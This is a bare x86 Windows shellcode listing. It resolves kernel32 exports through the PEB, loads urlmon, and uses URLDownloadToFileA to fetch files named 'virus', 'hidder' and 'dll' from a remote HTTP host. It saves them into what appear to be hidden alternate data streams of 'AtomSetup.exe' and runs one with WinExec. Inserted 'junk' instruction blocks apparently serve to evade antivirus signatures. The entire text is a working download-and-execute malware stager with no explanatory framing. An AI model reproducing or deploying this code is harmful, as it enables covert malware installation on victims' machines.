xor ecx, ecx                                                           
mov eax, fs:[ecx + 0x30]               ; EAX = PEB                     
mov eax, [eax + 0xc]                   ; EAX = PEB->Ldr                
mov esi, [eax + 0x14]                  ; ESI = PEB->Ldr.InMemOrder     
lodsd                                  ; EAX = Second module           
xchg eax, esi                          ; EAX = ESI, ESI = EAX          
lodsd                                  ; EAX = Third(kernel32)         
mov ebx, [eax + 0x10]                  ; EBX = Base address            
mov edx, [ebx + 0x3c]                  ; EDX = DOS->e_lfanew           
add edx, ebx                           ; EDX = PE Header               
mov edx, [edx + 0x78]                  ; EDX = Offset export table     
add edx, ebx                           ; EDX = Export table            
mov esi, [edx + 0x20]                  ; ESI = Offset namestable       
add esi, ebx                           ; ESI = Names table             
xor ecx, ecx                           ; EXC = 0                       

Get_Function:                                                          

inc ecx                                ; Increment the ordinal         
lodsd                                  ; Get name offset               
add eax, ebx                           ; Get function name             
cmp dword [eax], 0x50746547            ; GetP                          
jnz Get_Function                                                       
cmp dword [eax + 0x4], 0x41636f72      ; rocA                          
jnz Get_Function                                                       
cmp dword [eax + 0x8], 0x65726464      ; ddre                          
jnz Get_Function                                                       
mov esi, [edx + 0x24]                  ; ESI = Offset ordinals         
add esi, ebx                           ; ESI = Ordinals table          
mov cx, [esi + ecx * 2]                ; Number of function            
dec ecx                                                                
mov esi, [edx + 0x1c]                  ; Offset address table          
add esi, ebx                           ; ESI = Address table           
mov edx, [esi + ecx * 4]               ; EDX = Pointer(offset)         
add edx, ebx                           ; EDX = GetProcAddress          

mov ch, 0x6c                           ; START JUNK!!
mov cl, 0x6c
xor cl, ch                             
neg cl
neg ch
xor cl, ch                             ; END JUNK!
xor ecx, ecx                           ; ECX = 0                   
push ebx                               ; Kernel32 base address         
push edx                               ; GetProcAddress                
push ecx                               ; 0                             
push 0x41797261                        ; aryA                          
push 0x7262694c                        ; Libr
nop 
nop                          
push 0x64616f4c                        ; Load                          
push esp                               ; LoadLibrary                   
push ebx                               ; Kernel32 base address         
call edx                               ; GetProcAddress(LL)            

add esp, 0xf                           ; pop LoadLibrary               
sub esp, 0x3                           ; START JUNK!!
inc esp
inc esp
inc esp
nop
and ebx, ebx                           ; JUNK!!
nop
dec esp
dec esp
dec esp                                ; END JUNK!!
pop ecx                                ; ECX = 0                       
push eax                               ; EAX = LoadLibrary             

nop
nop

mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah                             
neg al
neg ah
xor al, ah                             ; END JUNK!
xor eax, eax
mov ax, 0x6c6c
push eax
nop
and edx, edx                           ; JUNK!!
nop
push 0x642e6e6f
push 0x6d6c7275
push esp                               ; String on the stack           
call [esp + 16]
add esp, 24                            ; START JUNK!!
sub esp, 12                            ; END JUNK!!
push eax                               ; DLL base on the stack         
and edx, edx                           ; JUNK!!
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah                             
neg al
neg ah
xor al, ah                             ; END JUNK!
xor eax, eax
mov ax, 0x4165
push eax
push 0x6c69466f
and edx, edx                           ; JUNK!!
push 0x5464616f
nop
nop
push 0x6c6e776f
push 0x444c5255
push esp                               ; String on the stack            
push dword [esp + 24] 
call [esp + 36]
add esp, 100                           ; START JUNK!!
sub esp, 20
sub esp, 20
and eax, eax                           ; JUNK!!
and ebx, ebx                           ; JUNK!!
and ecx, ecx
and edx, edx
and esp, esp
and esi, esi
and edi, edi
and ebp, ebp
sub esp, 20
sub esp, 20                            ; END JUNK!!
push eax                               ; Function address on the stack 
and edx, edx                           ; JUNK!!
xor eax, eax
mov eax, 0x23636578
push eax
sub dword [esp + 3], 0x23
push 0x456e6957
push esp                               ; String on the stack            
push dword [esp + 28] 
call [esp + 28]
add esp, 8
push eax                               ; Function address on the stack 
and edx, edx                           ; JUNK!!
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah                             
neg al
neg ah
xor al, ah                             ; END JUNK!
xor eax, eax
mov eax, 0x23737365
push eax
sub dword [esp + 3], 0x23
push 0x636f7250
and eax, eax                           ; JUNK!!
push 0x74697845
push esp                               ; String on the stack
and ecx, ecx                           ; JUNK!!            
push dword [esp + 36] 
call [esp + 36]
add esp, 12
push eax                               ; Function address on the stack 
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah                             
neg al
neg ah
xor al, ah                             ; END JUNK!
xor eax, eax
mov al, 0x73
nop
nop
push eax
push 0x75726976
and eax, eax                           ; JUNK!!
push 0x2f352e32
and ecx, ecx                           ; JUNK!!
push 0x2e302e30
and ebx, ebx                           ; JUNK!!
push 0x312f2f3a
and ecx, ecx                           ; JUNK!!
push 0x70747468
push esp
and edx, edx                           ; JUNK!!
xor eax, eax
mov eax, 0x23737572
push eax
sub dword [esp + 3], 0x23
push 0x69763a65
push 0x78652e70
and ebx, ebx                           ; JUNK!!
push 0x75746553
push 0x6d6f7441
push esp
and edx, edx                           ; JUNK!!
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah                             
neg al
neg ah
xor al, ah                             ; END JUNK!
xor eax, eax
push eax
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah                             
neg al
neg ah
xor al, ah                             ; END JUNK!
xor eax, eax
push eax
push dword [ESP + 8]
and ecx, ecx                           ; JUNK!!
push dword [ESP + 36]
xor eax, eax
push eax
call [ESP + 80]
add ESP, 52
mov ah, 0x6c                           ; START JUNK!!
mov al, 0x6c
xor al, ah                             
neg al
neg ah
xor al, ah                             ; END JUNK!
xor eax, eax
mov ax, 0x7265
nop
nop
push eax
push 0x64646968
and edx, edx                           ; JUNK!!
push 0x2f352e32
and eax, eax                           ; JUNK!!
push 0x2e302e30
nop
nop
push 0x312f2f3a
push 0x70747468
push esp
and ecx, ecx                           ; JUNK!!
xor eax, eax                            ; EAX = 0                       
push eax                                ; NULL on the stack             
push 0x72656464
push 0x69683a65
nop
and edx, edx                           ; JUNK!!
nop
push 0x78652e70
push 0x75746553
nop
nop
push 0x6d6f7441
push esp
and ecx, ecx                           ; JUNK!!
xor eax, eax
push eax
xor eax, eax
push eax
push dword [ESP + 8]
push dword [ESP + 40]
xor eax, eax
and edx, edx                           ; JUNK!!
push eax
call [ESP + 84]
add ESP, 56
xor eax, eax
and edx, edx                           ; JUNK!!
mov eax, 0x236c6c64
push eax
sub dword [esp + 3], 0x23
push 0x2f352e32
push 0x2e302e30
nop
nop
push 0x312f2f3a
push 0x70747468
push esp
and ecx, ecx                           ; JUNK!!
xor eax, eax
mov al, 0x6c
push eax
push 0x6c643a65
nop
and ebx, ebx                           ; JUNK!!
nop
push 0x78652e70
and ecx, ecx                           ; JUNK!!
push 0x75746553
nop
nop
push 0x6d6f7441
push esp
and edx, edx                           ; JUNK!!
xor eax, eax
push eax
xor eax, eax
push eax
push dword [ESP + 8]
and edx, edx                           ; JUNK!!
push dword [ESP + 36]
xor eax, eax
push eax
call [ESP + 76]
add ESP, 48
xor eax, eax                            ; EAX = 0                       
push eax                                ; NULL on the stack             
push 0x72656464
push 0x69683a65
and ebx, ebx                           ; JUNK!!
push 0x78652e70
nop
nop
push 0x75746553
and edx, edx                           ; JUNK!!
push 0x6d6f7441
push esp
and edx, edx                           ; JUNK!!
xor eax, eax
push eax
push dword [ESP + 4]
call [ESP + 40]
add ESP, 28
xor eax, eax
mov eax, 0x23737572
push eax
sub dword [esp + 3], 0x23
and edx, edx                           ; JUNK!!
push 0x69763a65
push 0x78652e70
nop
nop
push 0x75746553
and eax, eax                           ; JUNK!!
push 0x6d6f7441
push esp
and ecx, ecx                           ; JUNK!!
and edx, edx                           ; JUNK!!
push 0x1
push dword [ESP + 4]
call [ESP + 36]
add ESP, 24
and ecx, ecx                           ; JUNK!!
xor eax, eax
push eax
and edx, edx                           ; JUNK!!
call [ESP + 4]